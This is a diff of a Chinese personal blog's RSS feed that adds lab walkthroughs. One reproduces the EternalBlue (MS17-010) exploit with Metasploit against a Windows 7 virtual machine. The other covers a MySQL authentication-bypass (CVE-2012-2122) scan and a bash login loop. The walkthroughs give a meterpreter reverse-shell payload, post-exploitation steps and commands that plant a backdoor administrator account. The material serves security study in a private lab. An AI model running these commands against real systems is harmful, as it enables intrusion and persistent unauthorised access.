@@ -5,8 +5,147 @@
         <link>https://my011215.github.io</link>
         <description>用来记录学习和分享日常</description>
         <language>en</language>
-        <pubDate>Sun, 08 Jan 2023 16:56:30 +0800</pubDate>
-        <lastBuildDate>Sun, 08 Jan 2023 16:56:30 +0800</lastBuildDate>
+        <pubDate>Sun, 08 Jan 2023 23:57:30 +0800</pubDate>
+        <lastBuildDate>Sun, 08 Jan 2023 23:57:30 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://my011215.github.io/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/</guid>
+            <title>永恒之蓝漏洞复现</title>
+            <link>https://my011215.github.io/2023/01/08/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/</link>
+            <pubDate>Sun, 08 Jan 2023 23:57:30 +0800</pubDate>
+            <description><![CDATA[ &lt;!-- toc --&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#metasploit&#34;&gt;Metasploit&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BB%8B%E7%BB%8D&#34;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BD%BF%E7%94%A8&#34;&gt;使用&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#34;&gt;永恒之蓝漏洞复现&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#34;&gt;漏洞复现&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- tocstop --&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
+&lt;h2&gt;&lt;span id=&#34;metasploit&#34;&gt; Metasploit&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;参考：&lt;a href=&#34;https://zhuanlan.zhihu.com/p/62429064&#34;&gt;https://zhuanlan.zhihu.com/p/62429064&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://blog.csdn.net/weixin_45588247/article/details/119614618&#34;&gt;https://blog.csdn.net/weixin_45588247/article/details/119614618&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span id=&#34;介绍&#34;&gt; 介绍&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;Metasploit 是目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一。&lt;br&gt;
+Metasploit 提供两种不同的 UI，msfconsole 和 WebUI，主要使用 msfconsole 接口。因为 msfconsole 对 Metasploit 支持最好，可以使用所有功能。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Metasploit Framework：&lt;br&gt;
+这是一个免费的、开源的渗透测试框架，当前稳定版本是使用 Ruby 语言编写的。它拥有世界上最大的渗透测试攻击数据库，每年超过 100 万次的下载。它也是迄今为止使用 Ruby 构建的最复杂的项目之一。&lt;/li&gt;
+&lt;li&gt;Vulnerability：&lt;br&gt;
+漏洞&lt;/li&gt;
+&lt;li&gt;Exploit：&lt;br&gt;
+攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性。每个漏洞都有对应的漏洞利用程序。Metasploit 有超过 1700 个漏洞利用程序。&lt;/li&gt;
+&lt;li&gt;Payload：&lt;br&gt;
+攻击载荷。&lt;/li&gt;
+&lt;li&gt;Module：&lt;br&gt;
+模块是一个完整的构件，每个模块执行特定的任务，并通过几个模块组成一个单元运行。这种架构的好处是可以很容易的将自己写的利用程序和工具集成到框架中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span id=&#34;使用&#34;&gt; 使用&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;启动 msfconsole&lt;br&gt;
+ 设置 PostgreSQL 数据库，它将创建数据库用户，创建 msf 和 msf_test 数据库，配置 Metasploit 使用数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;service postgresql start&lt;/li&gt;
+&lt;li&gt;msfdb init&lt;/li&gt;
+&lt;li&gt;msfconsole&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;管理 Metasploit Framework 数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;msfdb&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;修改数据库配置文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;直接编辑 database.yml&lt;br&gt;
+ 文件位于 /usr/share/metasploit-framework/config/database.yml&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;检查数据库连接情况&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;启动 msfconsole，然后执行 db_status&lt;/li&gt;
+&lt;li&gt;db_disconnect ，断开连接&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;基本使用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole										    #进入框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search  ms17_010                                    # 使用search命令查找相关漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info     										    #使用info查看模块信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show options    									#查看模块需要配置的参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set  RHOST  192.168.100.158    					    #设置参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit / run     								    #攻击&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后渗透阶段											#后渗透阶段&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2&gt;&lt;span id=&#34;永恒之蓝漏洞复现&#34;&gt; 永恒之蓝漏洞复现&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;参考：&lt;a href=&#34;https://www.cnblogs.com/xy586/p/13537136.html&#34;&gt;https://www.cnblogs.com/xy586/p/13537136.html&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://blog.csdn.net/wwl012345/article/details/89421881&#34;&gt;https://blog.csdn.net/wwl012345/article/details/89421881&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;漏洞了解&lt;br&gt;
+永恒之蓝（Eternal Blue）爆发于 2017 年 4 月 14 日晚，是一种利用 Windows 系统的 SMB 协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于 2017 年 5 月 12 日， 不法分子通过改造 “永恒之蓝” 制作了 wannacry 勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span id=&#34;漏洞复现&#34;&gt; 漏洞复现&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;把 win7 防火墙关闭，kali ping win7&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/290.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/291.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;启动 msf&lt;br&gt;
+msfconsole&lt;/li&gt;
+&lt;li&gt;查看数据库连接情况&lt;br&gt;
+ db_status&lt;br&gt;
+postgresql connected to msf 说明已经成功连接到了 msf&lt;/li&gt;
+&lt;li&gt;搜索 ms17_010&lt;br&gt;
+search ms17_010&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/292.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;扫描命令&lt;br&gt;
+ use auxiliary/scanner/smb/smb_ms17_010&lt;br&gt;
+ 可以使用 show options 查看可使用参数&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/293.png?raw=true&#34; alt&gt;&lt;br&gt;
+由此发现扫描靶机确实存在永恒之蓝漏洞&lt;/li&gt;
+&lt;li&gt;进行攻击&lt;br&gt;
+ use exploit/windows/smb/ms17_010_eternalblue&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;设置攻击目标（靶机）：set rhost 192.168.21.133&lt;/li&gt;
+&lt;li&gt;设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp&lt;/li&gt;
+&lt;li&gt;设置监听主机（kali）：set lhost 192.168.21.132&lt;/li&gt;
+&lt;li&gt;利用 exploit 进行攻击：exploit&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/294.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;持续攻击&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;显示远程主机系统信息：sysinfo&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/295.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;查看用户身份：getuid&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/296.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;对远程主机当前屏幕进行截图：screenshot&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/297.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/298.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;获得 shell 控制台：shell&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/299.png?raw=true&#34; alt&gt;&lt;br&gt;
+ 显示转到 C:\Windows\system32 目录下，说明已经获得了 shell 的控制权&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;种植后门&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;在 windows 7 上创建一个 hack 的用户，以便下次访问&lt;br&gt;
+ net user hack 123456 /add&lt;/li&gt;
+&lt;li&gt;将 hack 加入到 windows 7 的本地管理员组中，以便获得更大权限&lt;br&gt;
+ net localgroup administrators hack /add&lt;/li&gt;
+&lt;li&gt;查看 windows 7 本地用户&lt;br&gt;
+ net user&lt;/li&gt;
+&lt;li&gt;查看 windows 7 本地管理员&lt;br&gt;
+ net localgroup administrators&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/300.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://my011215.github.io/2023/01/08/vulnerability/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
             <title>vulhub漏洞复现</title>
@@ -21,8 +160,13 @@
 &lt;li&gt;&lt;a href=&#34;#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E7%A7%8D%E6%A4%8D%E5%90%8E%E9%97%A8&#34;&gt;获取数据库权限，种植后门&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#mysql-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2012-2122&#34;&gt;（Mysql） 身份认证绕过漏洞（CVE-2012-2122）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#phpmyadmin-scriptssetupphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ewooyun-2016-199433&#34;&gt;（phpmyadmin scripts/setup.php） 反序列化漏洞（WooYun-2016-199433）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#mysql-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2012-2122&#34;&gt;（Mysql） 身份认证绕过漏洞（CVE-2012-2122）&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&#34;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#metasploit&#34;&gt;Metasploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#bash&#34;&gt;Bash&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- tocstop --&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
@@ -94,81 +238,51 @@
 &lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/284.png?raw=true&#34; alt&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h2&gt;&lt;span id=&#34;mysql-身份认证绕过漏洞cve-2012-2122&#34;&gt; （Mysql） 身份认证绕过漏洞（CVE-2012-2122）&lt;/span&gt;&lt;/h2&gt;
-&lt;h2&gt;&lt;span id=&#34;phpmyadmin-scriptssetupphp-反序列化漏洞wooyun-2016-199433&#34;&gt; （phpmyadmin scripts/setup.php） 反序列化漏洞（WooYun-2016-199433）&lt;/span&gt;&lt;/h2&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://my011215.github.io/2023/01/06/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/</guid>
-            <title>永恒之蓝漏洞复现</title>
-            <link>https://my011215.github.io/2023/01/06/vulnerability/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E/</link>
-            <pubDate>Fri, 06 Jan 2023 21:25:30 +0800</pubDate>
-            <description><![CDATA[ &lt;!-- toc --&gt;
+&lt;p&gt;参考：&lt;a href=&#34;http://t.csdn.cn/X9xAM&#34;&gt;http://t.csdn.cn/X9xAM&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span id=&#34;漏洞原理&#34;&gt; 漏洞原理&lt;/span&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;只要知道用户名，不断尝试就能够直接登入，类似爆破思想&lt;/li&gt;
+&lt;li&gt;当连接 MariaDB/MySQL 时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是 memcmp () 返回一个非零值，也会使 MySQL 认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入 SQL 数据库。&lt;/li&gt;
+&lt;li&gt;个人感觉应该是代码逻辑问题&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;&lt;span id=&#34;metasploit&#34;&gt; Metasploit&lt;/span&gt;&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#metasploit&#34;&gt;Metasploit&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#%E4%BB%8B%E7%BB%8D&#34;&gt;介绍&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#%E4%BD%BF%E7%94%A8&#34;&gt;使用&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#34;&gt;永恒之蓝漏洞复现&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;!-- tocstop --&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
-&lt;h2&gt;&lt;span id=&#34;metasploit&#34;&gt; Metasploit&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;参考：&lt;a href=&#34;https://zhuanlan.zhihu.com/p/62429064&#34;&gt;https://zhuanlan.zhihu.com/p/62429064&lt;/a&gt;&lt;br&gt;
-&lt;a href=&#34;https://blog.csdn.net/weixin_45588247/article/details/119614618&#34;&gt;https://blog.csdn.net/weixin_45588247/article/details/119614618&lt;/a&gt;&lt;/p&gt;
-&lt;h3&gt;&lt;span id=&#34;介绍&#34;&gt; 介绍&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;Metasploit 是目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一。&lt;br&gt;
-Metasploit 提供两种不同的 UI，msfconsole 和 WebUI，主要使用 msfconsole 接口。因为 msfconsole 对 Metasploit 支持最好，可以使用所有功能。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Metasploit Framework：&lt;br&gt;
-这是一个免费的、开源的渗透测试框架，当前稳定版本是使用 Ruby 语言编写的。它拥有世界上最大的渗透测试攻击数据库，每年超过 100 万次的下载。它也是迄今为止使用 Ruby 构建的最复杂的项目之一。&lt;/li&gt;
-&lt;li&gt;Vulnerability：&lt;br&gt;
-漏洞&lt;/li&gt;
-&lt;li&gt;Exploit：&lt;br&gt;
-攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性。每个漏洞都有对应的漏洞利用程序。Metasploit 有超过 1700 个漏洞利用程序。&lt;/li&gt;
-&lt;li&gt;Payload：&lt;br&gt;
-攻击载荷。&lt;/li&gt;
-&lt;li&gt;Module：&lt;br&gt;
-模块是一个完整的构件，每个模块执行特定的任务，并通过几个模块组成一个单元运行。这种架构的好处是可以很容易的将自己写的利用程序和工具集成到框架中。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;&lt;span id=&#34;使用&#34;&gt; 使用&lt;/span&gt;&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;启动 msfconsole&lt;br&gt;
- 设置 PostgreSQL 数据库，它将创建数据库用户，创建 msf 和 msf_test 数据库，配置 Metasploit 使用数据库&lt;/li&gt;
+&lt;li&gt;查看端口&lt;br&gt;
+ docker ps&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/285.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;靶机 IP 地址&lt;br&gt;
+ ifconfig&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/286.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;li&gt;启动 Metasploit&lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol&gt;
-&lt;li&gt;service postgresql start&lt;/li&gt;
-&lt;li&gt;msfdb init&lt;/li&gt;
 &lt;li&gt;msfconsole&lt;/li&gt;
+&lt;li&gt;search CVE-2012-2122&lt;/li&gt;
+&lt;li&gt;use auxiliary/scanner/mysql/mysql_authbypass_hashdump&lt;/li&gt;
+&lt;li&gt;show options&lt;/li&gt;
+&lt;li&gt;根据 options 设置攻击靶机和线程&lt;br&gt;
+ set rhosts 192.168.21.132&lt;br&gt;
+set threads 100&lt;/li&gt;
+&lt;li&gt;开始攻击&lt;br&gt;
+ run&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/287.png?raw=true&#34; alt&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;管理 Metasploit Framework 数据库&lt;/li&gt;
+&lt;li&gt;结过&lt;br&gt;
+没扫出来捏，我看好多博主也失败了，不知道什么原因。&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/288.png?raw=true&#34; alt&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;ol&gt;
-&lt;li&gt;msfdb&lt;/li&gt;
-&lt;/ol&gt;
+&lt;h3&gt;&lt;span id=&#34;bash&#34;&gt; Bash&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;Bash 是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。Bash 还能从文件中读取命令，这样的文件称为脚本。&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;修改数据库配置文件&lt;/li&gt;
+&lt;li&gt;seq&lt;/li&gt;
 &lt;/ul&gt;
-&lt;ol&gt;
-&lt;li&gt;直接编辑 database.yml&lt;br&gt;
- 文件位于 /usr/share/metasploit-framework/config/database.yml&lt;/li&gt;
-&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;用法：seq [选项]... 尾数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　或：seq [选项]... 首数 尾数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　或：seq [选项]... 首数 增量 尾数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;以指定增量从首数开始打印数字到尾数。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;ul&gt;
-&lt;li&gt;检查数据库连接情况&lt;/li&gt;
+&lt;li&gt;构造脚本&lt;/li&gt;
 &lt;/ul&gt;
-&lt;ol&gt;
-&lt;li&gt;启动 msfconsole，然后执行 db_status&lt;/li&gt;
-&lt;li&gt;db_disconnect ，断开连接&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;基本使用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole										    #进入框架&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search  ms17_010                                    # 使用search命令查找相关漏洞&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info     										    #使用info查看模块信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/reverse_tcp    	#设置攻击载荷&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show options    									#查看模块需要配置的参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set  RHOST  192.168.100.158    					    #设置参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit / run     								    #攻击&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;后渗透阶段											#后渗透阶段&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2&gt;&lt;span id=&#34;永恒之蓝漏洞复现&#34;&gt; 永恒之蓝漏洞复现&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;参考：&lt;a href=&#34;https://www.cnblogs.com/xy586/p/13537136.html&#34;&gt;https://www.cnblogs.com/xy586/p/13537136.html&lt;/a&gt;&lt;br&gt;
-&lt;a href=&#34;https://blog.csdn.net/wwl012345/article/details/89421881&#34;&gt;https://blog.csdn.net/wwl012345/article/details/89421881&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;for i in `seq 1 1000`; do mysql -uroot -pwrong -h 192.168.21.132 -P3306 ; done&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/289.png?raw=true&#34; alt&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
